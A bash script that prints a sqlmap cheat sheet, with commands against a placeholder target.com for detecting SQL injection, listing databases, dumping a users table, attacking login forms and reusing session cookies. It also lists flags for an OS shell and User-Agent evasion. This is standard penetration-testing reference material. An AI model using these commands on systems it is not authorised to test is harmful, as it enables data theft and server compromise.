#!/bin/bash
echo -e "\033[32m╔══════════════════════════════════════╗"
echo -e "║  💉 SQLmap — SQL Injection & DB Nav ║"
echo -e "╚══════════════════════════════════════╝\033[0m"
echo
echo -e "\033[33mWhy use it:\033[0m Automatically detects and exploits SQL injection"
echo "  vulnerabilities in web apps. Once it finds an injectable parameter,"
echo "  it can enumerate databases, list tables, dump columns, and extract"
echo "  data — full database navigation through a web URL. The #1 tool for"
echo "  SQLi. Also supports: POST params, cookies, headers, WAF bypass,"
echo "  OS shell, and reading/writing files on the DB server."
echo
echo -e "\033[33mBasic detection:\033[0m"
echo "  sqlmap -u 'http://target.com/page?id=1' --batch"
echo "  sqlmap -u 'http://target.com/page?id=1' --batch --risk=3 --level=5"
echo
echo -e "\033[33mNavigate the database:\033[0m"
echo "  sqlmap -u 'http://target.com/page?id=1' --dbs              # list databases"
echo "  sqlmap -u 'http://target.com/page?id=1' -D mydb --tables   # list tables"
echo "  sqlmap -u 'http://target.com/page?id=1' -D mydb -T users --columns"
echo "  sqlmap -u 'http://target.com/page?id=1' -D mydb -T users --dump"
echo
echo -e "\033[33mPOST data / forms:\033[0m"
echo "  sqlmap -u 'http://target.com/login' --data='user=admin&pass=1' --batch"
echo
echo -e "\033[33mWith cookies (authenticated):\033[0m"
echo "  sqlmap -u 'http://target.com/dashboard?id=1' --cookie='PHPSESSID=abc123' --batch"
echo
echo -e "\033[33mKey flags:\033[0m"
echo "  --dbs            List databases"
echo "  -D DB --tables   List tables in database"
echo "  -D DB -T TBL --columns   List columns"
echo "  -D DB -T TBL --dump      Dump table data"
echo "  --batch          Non-interactive (no prompts)"
echo "  --risk=3         Risk level 1-3 (3 = aggressive)"
echo "  --level=5        Test level 1-5 (5 = test all)"
echo "  --os-shell       Get an OS shell (if DB allows)"
echo "  --random-agent   Use random User-Agent"
echo -e "\033[90m──────────────────────────────────────\033[0m"
echo
echo -e "\033[33m💡 Tip: Use the SQLmap Console at /sqlmap for guided DB navigation.\033[0m"
